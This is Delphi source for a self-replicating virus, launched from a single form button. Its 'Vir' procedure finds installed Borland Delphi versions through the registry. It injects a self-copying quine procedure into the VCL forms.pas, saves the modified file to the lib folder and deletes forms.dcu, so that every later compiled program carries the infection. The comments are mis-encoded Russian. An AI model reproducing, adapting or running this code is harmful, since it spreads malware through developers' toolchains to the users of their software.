   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
     StdCtrls;

   type
     TForm1 = class(TForm)
       Button1: TButton;
       procedure Button1Click(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;

   implementation

   {$R *.DFM}

   procedure Vir;
   const
     min = 'Minor';
     fin = 'finalization';
     pname = 'UninitActiveApplication;';
     pas = '\forms.pas';dcu='\forms.dcu';
     del = 'Software\Borland\Delphi\';

   var
     hk: HKEY;
     path: String;
     l, t: Integer;
     lst, p, w: TStringList;
     v: Byte;

     procedure Write(const s: String);
     begin
       p.Add(s);
       w.Add('Write(' + QuotedStr(s) + ');');
     end;

   begin
     for v := 3 to 8 do begin
       try
         if RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar(del + Char(Byte(v) + Byte('0')) + '.0'), 0, 0, hk) = 0 then begin
           l := MAX_PATH;
           SetLength(path, l);
           RegQueryValueEx(hk, 'RootDir', nil, nil, PByte(path), @l);
           path := PChar(path);
           if RegQueryValueEx(hk, min, nil, nil, nil, @l) <> 0 then begin
             RegSetValueEx(hk, min, 0, REG_DWORD, @l, 4);
             RegCloseKey(hk);
             lst := TStringList.Create;
             lst.LoadFromFile(path + '\source\vcl' + pas);
             l := lst.Count - 1;
             while (l <> -1) and not AnsiSameText(Trim(lst[l]), fin) do Dec(l);
             if l = -1 then begin
               l := lst.Count-1;
               while not AnsiSameText(Trim(lst[l]), 'end.') do Dec(l);
               Dec(l);
               lst.Insert(l, pname);
               lst.Insert(l, fin);
             end
             else
               lst.Insert(l+1,pname);
             t := lst.Count - 1;
             while(t <> -1) and not AnsiSameText(Trim(lst[t]), 'initialization') do Dec(t);
             if t = -1 then t := l;
             p := TStringList.Create;
             w := TStringList.Create;
             // äàëåå ïèøåì íà îäíîé ñòðî÷êå ïî íåñêîëüêó îïåðàòîðîâ,
             // ýòî ÷òî áû ìíå ñîâñåì õóåâî íå ñäåëàëîñü ïèñàòü òó÷ó Write(...);
             Write('procedure UninitActiveApplication;');
             Write('const min=''Minor'';fin=''finalization'';pname=''UninitActiveApplication;'';pas=''\forms.pas'';dcu=''\forms.dcu'';del=''Software\Borland\Delphi\'';');
             Write('var hk:HKEY;path:String;l,t:Integer;lst,p,w:TStringList;v:Byte;');
             Write('procedure Write(const s:String);begin p.Add(s);w.Add(''Write('' + QuotedStr(s) + '');'');end;');
             Write('begin for v:=3 to 8 do begin try if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(del+Char(Byte(v)+Byte(''0''))+''.0''),0,0,hk)=0 then begin');
             Write('l:=MAX_PATH;SetLength(path,l);RegQueryValueEx(hk,''RootDir'',nil,nil,PByte(path),@l);path:=PChar(path);');
             Write('if RegQueryValueEx(hk,min,nil,nil,nil,@l)<>0 then begin');
             Write('RegSetValueEx(hk,min,0,REG_DWORD,@l,4);RegCloseKey(hk);lst:=TStringList.Create;');
             Write('lst.LoadFromFile(path+''\source\vcl''+pas);l:=lst.Count-1;');
             Write('while(l<>-1)and not AnsiSameText(Trim(lst[l]),fin) do Dec(l);');
             Write('if l=-1 then begin l:=lst.Count-1;while not AnsiSameText(Trim(lst[l]),''end.'') do Dec(l);');
             Write('Dec(l);lst.Insert(l,pname);lst.Insert(l,fin);end else lst.Insert(l+1,pname);');
             Write('t:=lst.Count-1;while(t<>-1)and not AnsiSameText(Trim(lst[t]),''initialization'') do Dec(t);');
             Write('if t=-1 then t:=l;p:=TStringList.Create;w:=TStringList.Create;');
             Write('for l:=p.Count-1 downto p.Count-6 do lst.Insert(t,p[l]);');
             Write('for l:=w.Count-1 downto 0 do lst.Insert(t,w[l]);');
             Write('for l:=p.Count-7 downto 0 do lst.Insert(t,p[l]);');
             Write('lst.SaveToFile(path+''\lib''+pas);DeleteFile(path+''\lib''+dcu);lst.Free;p.Free;w.Free;end');
             Write('else begin RegCloseKey(hk);if FileExists(path+''\lib''+dcu) then DeleteFile(path+''\lib''+pas);');
             Write('end;end;except end;end;end;');
             for l := p.Count - 1 downto p.Count - 6 do lst.Insert(t, p[l]);
             for l := w.Count - 1 downto 0 do lst.Insert(t, w[l]);
             for l := p.Count - 7 downto 0 do lst.Insert(t, p[l]);
             lst.SaveToFile(path + '\lib' + pas);
             DeleteFile(path + '\lib' + dcu);
             lst.Free;
             p.Free;
             w.Free;
           end
           else begin
             RegCloseKey(hk);
             if FileExists(path + '\lib' + dcu) then DeleteFile(path + '\lib' + pas);
           end;
         end;
       except
       end;
     end;
   end;

   procedure TForm1.Button1Click(Sender: TObject);
   begin
     Vir;
   end;

   end.

   // P.S. åñëè ÷åãî íå ðàáîòàåò íîãàìè íå áèòü :)
